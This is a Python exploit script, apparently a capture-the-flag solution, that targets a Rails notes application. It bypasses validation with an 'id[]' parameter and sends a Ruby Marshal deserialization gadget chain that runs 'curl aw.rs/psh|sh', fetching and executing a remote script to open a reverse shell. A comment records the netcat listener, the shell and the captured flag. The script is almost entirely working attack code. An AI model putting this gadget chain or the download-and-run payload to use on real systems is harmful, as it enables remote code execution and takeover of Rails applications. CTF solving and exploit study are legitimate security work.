#!/usr/bin/env python

"""
* Validation can be bypassed using `id[]=` causing the `.count` method to be called on an array instead of a string
* This allows for arbitary paths to be set and any data to be unmarshaled
* Existing gadget mentioned in http://phrack.org/issues/69/12.html#article has finally be patched
* A gadget can be found at https://github.com/rails/rails/blob/v6.1.0.rc1/activemodel/lib/active_model/attribute_methods.rb#L369, it will run:
`@owner.module_eval(@sources.join(";"), @path, @line - 1)` via the exeute method. The existing `DeprecatedInstanceVariableProxy` trick can still be 
used to call arbitrary methods in most cases. Payload can be generated with:

$ irb
require "active_model"

cg = ActiveModel::AttributeMethods::ClassMethods.const_get("CodeGenerator").new(ActiveModel, "", 0)
cg.instance_variable_set :@sources, ["`curl aw.rs/psh|sh`\n"]

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(cg, :execute)

payload = Marshal.dump(depr)
puts payload.inspect
"""

import requests
import urllib.parse

if __name__ == "__main__":
    
    s = requests.Session()
    host = "https://r0bynotes.chal.perfect.blue"

    r = s.get(host + "/users/new")

    authenticity_token = r.text.split('name="authenticity_token" value="')[1].split('"')[0]
    r = s.get(host + "/users/new")

    payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\x10ActiveModel:\n@pathI\"\x00\x06:\x06ET:\n@linei\x00:\r@sources[\x06I\"\x19`curl aw.rs/psh|sh`\n\x06;\nT:\r@renames{\x00:\f@method:\fexecute:\t@varI\"\r@execute\x06;\nT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\nT"


    data = {
        "authenticity_token": authenticity_token,
        "id[]": "/notes/vakzzffdt",
        "user[username]": "vakzz",
        "user[name]": payload
    }

    s.post(host + "/users", data=data)
    r = s.get(host + "/notes/vakzzffdt")
    print(r.text)

    """
    $ nc -nlkp 12345
    /bin/sh: 0: can't access tty; job control turned off
    $ /read_flag
    flag{wh3n_c0un7_d035n7_c0un7}
    """
